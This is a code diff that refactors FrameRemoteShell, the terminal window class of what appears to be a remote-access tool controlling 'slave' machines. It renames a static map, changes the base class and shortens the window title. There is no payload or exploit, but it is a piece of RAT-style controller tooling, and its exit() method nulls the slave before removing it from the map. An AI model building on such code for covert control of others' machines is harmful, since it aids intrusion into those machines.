@@ -23,9 +23,9 @@ import com.redpois0n.terminal.JTerminal;
 import com.redpois0n.terminal.SizeChangeListener;
 
 @SuppressWarnings("serial")
-public class FrameRemoteShell extends BaseFrame {
+public class FrameRemoteShell extends JFrame {
 
-	public static final Map<Slave, FrameRemoteShell> instances = new HashMap<Slave, FrameRemoteShell>();
+	public static final Map<Slave, FrameRemoteShell> INSTANCES = new HashMap<Slave, FrameRemoteShell>();
 	
 	private Slave slave;
 	private JTerminal terminal;
@@ -35,7 +35,7 @@ public class FrameRemoteShell extends BaseFrame {
 		super();
 		setResizable(false);
 		this.slave = slave;
-		instances.put(slave, this);
+		INSTANCES.put(slave, this);
 		addWindowListener(new WindowAdapter() {
 			@Override
 			public void windowClosing(WindowEvent arg0) {
@@ -43,7 +43,7 @@ public class FrameRemoteShell extends BaseFrame {
 			}
 		});
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteShell.class.getResource("/icons/cmd.png")));
-		setTitle("Remote Shell - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
+		setTitle("Remote Shell");
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 499, 302);
 
@@ -89,7 +89,7 @@ public class FrameRemoteShell extends BaseFrame {
 			}
 		});
 		
-		getContentPane().add(scrollPane, BorderLayout.CENTER);
+		add(scrollPane, BorderLayout.CENTER);
 
 		addKeyListener(terminal.getKeyListener());
 		setSize(675, 300);
@@ -108,6 +108,6 @@ public class FrameRemoteShell extends BaseFrame {
 	public void exit() {
 		slave.addToSendQueue(new Packet24RemoteShellStop());
 		slave = null;
-		instances.remove(slave);
+		INSTANCES.remove(slave);
 	}
 }
